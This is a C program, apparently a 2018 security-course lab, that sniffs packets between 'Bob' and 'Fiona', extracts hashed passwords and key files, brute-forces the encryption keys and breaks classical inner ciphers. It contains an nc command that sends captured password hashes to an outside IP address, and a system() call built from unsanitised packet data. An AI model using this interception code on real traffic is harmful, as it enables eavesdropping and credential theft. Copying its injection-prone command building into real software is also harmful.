/**
 * This program sniffs Bob's messages to Fiona and deciphers them.
 * 
 * Name: Tien Thuy Ho
 * Date: 03/09/2018
 */

#include "utils.h"
#include "pcap_sniffer.h"
#include "cipher.h"
#include "crypto.h"

#define EXTRA                     4   //52
#define PASSWORDFILE "password.txt"

struct thread_input {
    char start_alphabet[ALPHABETLEN];
    char alphabet[ALPHABETLEN];
    char permutation[ALPHABETLEN];
};

unsigned char ciphertext[MAXLINE];
char cmd[MAXLINE];
int ciphertext_len, timing, num_messages;
struct message_info **messages;

/**
 * Get the next key from the keyblob.
 */
static void nextkey(char *keyblob, char *key, int startindex) {   
    bzero(key, KEYSIZE + 1);
    strncpy(key, keyblob + startindex, KEYSIZE);
}

/**
 * Write the deciphered message to a text file.
 */
static void record_message(char *plaintext, char *filename) {
    FILE *messagefd = fopen(filename, "w");
    if (messagefd) {
        fputs(plaintext, messagefd);
    }

    return;
}

/**
 * Unzip a key.zip file and extract the keyblob.
 */
void unzip_key(char *passwd, int index, char *keyblob) {
    char filename[MAXCHAR];
    sprintf(filename, "./keys/key%d.zip", index);

    sprintf(cmd, "rm %s", "key");
    system(cmd);

    sprintf(cmd, "unzip -P %s %s", passwd, filename);
    system(cmd);

    FILE *keyfd = fopen("key", "r");
    if (keyfd) {
        fgets(keyblob, MAXLINE, keyfd);
    }
}

/**
 * Combine packets into messages.
 */
void get_messages(struct packet_info **packets, int num_packets) {
    printf("-------------------------------------------------------------------------------------------------------------------\n");
    printf("OPENING PACKETS: \n");
    num_messages = num_packets / MESSAGELEN;
    printf("There are %d messages.\n", num_messages);
    messages = (struct message_info **) malloc(sizeof(struct message_info *) * num_messages);
    for (int i = 0; i < num_messages; i++) {
        messages[i] = (struct message_info *) malloc(sizeof(struct message_info));
        bzero(messages[i]->passwd, PASSWDLEN + 1);
    }

    char filename[MAXCHAR];
    int counter = 0;
    FILE *keyfd; 
    for (int i = 0; i < num_packets; i += MESSAGELEN) {
        printf("MESSAGE %d:\n", counter);
        fflush(stdout);

        // copy the password
        bzero(messages[counter]->cryptpasswd, CRYPTPASSWDLEN + 1);
        int passwdlen = packets[i]->len;
        if (packets[i]->payload[passwdlen - 1] == '\n') {
            passwdlen -= 1;
        } 
        strncpy(messages[counter]->cryptpasswd, (char *) packets[i]->payload, passwdlen);
        printf("Password: %s\n", messages[counter]->cryptpasswd);
        printf("Password Length: %d\n", passwdlen);

        // copy the key.zip
        sprintf(filename, "./keys/key%d.zip", counter);
        keyfd = fopen(filename, "wb");
        if (keyfd) {
            fwrite(packets[i + 1]->payload, 1, packets[i + 1]->len, keyfd);
            fclose(keyfd);
        }

        // copy the IV
        int ivlen = packets[i + 2]->len;
        bzero(messages[counter]->iv, IVLEN + 1);
        if (packets[i + 2]->payload[ivlen - 1] == '\n') {
            ivlen -= 1;
        } 
        strncpy(messages[counter]->iv, (char *) packets[i + 2]->payload, ivlen);
        printf("IV: %s\n", messages[counter]->iv); 
        printf("IV Length: %d\n\n", ivlen);

        // copy the payload
        messages[counter]->ciphertexts = (struct ciphertext **) malloc(sizeof(struct ciphertext *) * NUM_CIPHER);
        for (int j = 0; j < NUM_CIPHER; j++) {
            messages[counter]->ciphertexts[j] = (struct ciphertext *) malloc(sizeof(struct ciphertext));
            messages[counter]->ciphertexts[j]->content = packets[i + 3 + j]->payload;
            messages[counter]->ciphertexts[j]->len = packets[i + 3 + j]->len;
        }

        messages[counter]->plaintext = (char **) malloc(sizeof (char *) * NUM_CIPHER);

        counter++;
    }
}

/**
 * Send crypted passwords to the NSA.
 */
void send_passwords() {
    printf("Listening to %s at port %d \n", LISTEN_IPADDR, LISTEN_PORT);
    for (int i = 0; i < num_messages; i++) {
        printf("%d\n", i);
        fflush(stdout);
        sprintf(cmd, "echo %s %s %d | nc 128.114.59.42 2001", messages[i]->cryptpasswd, LISTEN_IPADDR, LISTEN_PORT);
        system(cmd);
        sleep(10);
    }
}

/**
 * Save the passwords received from the NSA.
 */
void update_passwords() {
    printf("-------------------------------------------------------------------------------------------------------------------\n");
    printf("CRACKING PASSWORDS: \n");
    FILE *passwdfd = fopen(PASSWORDFILE, "r");
    char line[MAXLINE];
    if (passwdfd) {
        while (fgets(line, MAXLINE, passwdfd)) {
            char *cryptpasswd = strtok(line, " ");
            char *passwd = strtok(NULL, " ");

            int done = FALSE;
            for (int i = 0; i < num_messages && !done; i++) {
                if (strlen(messages[i]->passwd) == 0 && strcmp(messages[i]->cryptpasswd, cryptpasswd) == 0) {
                    strncpy(messages[i]->passwd, passwd, PASSWDLEN);
                    printf("Message %d: %s\n", i, messages[i]->passwd);
                    done = TRUE;
                }
            }
        }
    }
}

/**
 * Decrypt a message encrypted with the EVP symmetric algorithm. 
 */
int decrypt_message(struct message_info *message, int index) {
    char keyblob[MAXLINE];
    unzip_key(message->passwd, index, keyblob);

    int trials = strlen((char *) keyblob) - KEYSIZE + 1;
    char key[KEYSIZE + 1];
    int plaintext_len;
    int finished;
    unsigned char plaintext[MAXLINE];
    for (int j = 0; j < NUM_CIPHER; j++) {
        finished = FALSE;
        for (int i = 0; i < trials && !finished; i++) {
            nextkey(keyblob, key, i);
            bzero(plaintext, MAXLINE);
            plaintext_len = decrypt(message->ciphertexts[j]->content, message->ciphertexts[j]->len, (unsigned char *) key, (unsigned char *) message->iv, plaintext);
            if (plaintext_len != -1  && (plaintext[0] == '\n' || plaintext[0] == ' ')) { // && (strstr((char *) plaintext, "Sonnet") != NULL
                // record my message
                // if (strstr((char *) plaintext, "tithho") != NULL)
                //     record_message((char *) plaintext, "message_p2.txt");

                message->plaintext[j] = (char *) malloc(plaintext_len + 1);
                strncpy(message->plaintext[j], (char *) plaintext, plaintext_len);
                printf("MESSAGE %d-%d of length %d: \n", index, j, plaintext_len);
                printf("%s\n", plaintext);
                fflush(stdout);
                finished = TRUE;
            }
        }
    }

    return TRUE;
}

/**
 * Decrypt all the messages encrypted with the EVP symmetric algorithm. 
 */
int decrypt_messages(int num_messages) {
    printf("-------------------------------------------------------------------------------------------------------------------\n");
    printf("DECRYPTING MESSAGES: \n");
    int decrypted_messages = 0;
    for (int i = 0; i < num_messages; i++) {
        if (decrypt_message(messages[i], i)) {
            decrypted_messages++;
        }
    }

    return decrypted_messages;
}

/**
 * Decipher all the first inner messages. 
 */
int decipher_1_all(struct message_info **messages, int num_messages) {
    printf("-------------------------------------------------------------------------------------------------------------------\n");
    printf("FIND MY MESSAGE: \n");
    for (int i = 0; i < num_messages; i++) {
        for (int j = 0; j < ALPHABETLEN; j++) {
            // printf("MESSAGE %d: \n", i);
            char plaintext[strlen(messages[i]->plaintext[0]) + 1];
            bzero(plaintext, strlen(messages[i]->plaintext[0]) + 1);
            if (decipher_caesar(messages[i]->plaintext[0], j, plaintext)) {
                printf("=> Message %d\n", i);
                return i;
            }
        }
    }

    return -1;
}

/**
 * Decrypt the first inner message. 
 */
void decipher_1(const char *message) {
    int rotation = 13;
    char plaintext[strlen(message) + 1];
    bzero(plaintext, strlen(message) + 1);

    decipher_caesar(message, rotation, plaintext);
    record_message(plaintext, "message_p3_1.txt");
}

/**
 * Decrypt the second inner message. 
 */
void decipher_2(const char *message, char *cryptid, char *id) {
    int keylen = 4;
    char plaintext[strlen(message) + 1];
    bzero(plaintext, strlen(message) + 1);
    char *guessed_key = find_vigenere_key(keylen, cryptid, id);
    
    if (strcmp(guessed_key, "Not Found") != 0) {
        char rotation_template[strlen(guessed_key) * 2 + 1];
        bzero(rotation_template, strlen(guessed_key) * 2 + 1);
        strncpy(rotation_template, guessed_key, keylen);
        strcat(rotation_template, guessed_key);

        char key[keylen + 1];
        for (int i = 0; i < keylen; i++) {
            strncpy(key, rotation_template + i, keylen);
            decipher_vigenere(key, message, plaintext);
        }

        record_message(plaintext, "message_p3_2.txt");
    } 
}

/**
 * Decrypt the third inner message. 
 */
void decipher_3(const char *message) {
    char plaintext[strlen(message) + 1];
    bzero(plaintext, strlen(message) + 1);
    
    generate_polybius_square(ALPHABET);
    decipher_polybius_square(message, plaintext);
    record_message(plaintext, "message_p3_3.txt");
}

/**
 * Decrypt all the inner messages. 
 */
void decipher_all(struct message_info *message) {
    // printf("%s\n", message->plaintext[0]);
    printf("Plaintext 1:\n");
    decipher_1(message->plaintext[0]);
    // printf("%s\n", message->plaintext[1]);
    printf("Plaintext 2:\n");
    decipher_2(message->plaintext[1], "zpbqnv", "tithho");
    // printf("%s\n", message->plaintext[2]);
    printf("Plaintext 3:\n");
    decipher_3(message->plaintext[2]);
}

static void cleanupThreads(pthread_t *threads, int numThreads) {
    for (int i = 0; i < numThreads; i++) {
        pthread_join(threads[i], NULL);
    }

    return;
}

static void *thread_permute(void *arg) {
    struct thread_input *params = (struct thread_input *) arg;
    if (params != NULL) 
        start_permute(params->start_alphabet, params->alphabet, params->permutation); 
    return NULL;
}

void remove_characters(char *start_alphabet, char *alphabet, int start_index, int len) {
    for (int i = 0; i < ALPHABETLEN - 1; i++) {
        start_alphabet[i] = '-'; 
    }

    strncpy(start_alphabet + start_index, alphabet + start_index, len);
    printf("%s\n", start_alphabet);
}

void generate_permutations(int nthreads, char *alphabet, char *permutation) {
    pthread_t tids[nthreads];
    int start_index = 0;
    int len = 1;
    for (int i = 0; i < nthreads; i++) {
        struct thread_input *params = (struct thread_input *) malloc(sizeof(struct thread_input));
        bzero(params, sizeof(struct thread_input));
        strncpy(params->alphabet, alphabet, strlen(alphabet));
        strncpy(params->permutation, permutation, strlen(permutation));
        remove_characters(params->start_alphabet, params->alphabet, start_index, len);
        start_index += len;
        pthread_create(&(tids[i]), NULL, &thread_permute, params);
    }

    cleanupThreads(tids, nthreads);
}

int main(int argc, char **argv) {
    // sniff();
    
    // get non-trivial packets
    struct packet_info **packets = (struct packet_info **) malloc(sizeof(struct packet_info *) * MAXPACKETS);
    for (int i = 0; i < MAXPACKETS; i++) {
        packets[i] = (struct packet_info *) malloc(sizeof(struct packet_info));
    }  
    int num_packets = filter_packets(packets);

    // phase 3_1remove background password packets
    int start_packet = 0;
    int end_packet = num_packets - 1;
    while(packets[start_packet++]->len == 13);
    start_packet--;
    while(packets[end_packet--]->len == 13);
    end_packet++;

    // save messages
    get_messages(packets + start_packet, end_packet - start_packet + 1);

    // send_passwords();

    // decrypt the messages
    update_passwords();
    int decrypted_messages = decrypt_messages(num_messages);
    printf("Number of decrypted messages: %d\n", decrypted_messages);

    // find my messages and decipher them
    int m_message = decipher_1_all(messages, num_messages);
    if (m_message != -1) {
        printf("-------------------------------------------------------------------------------------------------------------------\n");
        printf("FINAL RESULT: \n");
        printf("MESSAGE %d:\n", m_message);
        decipher_all(messages[m_message]);
    }
}

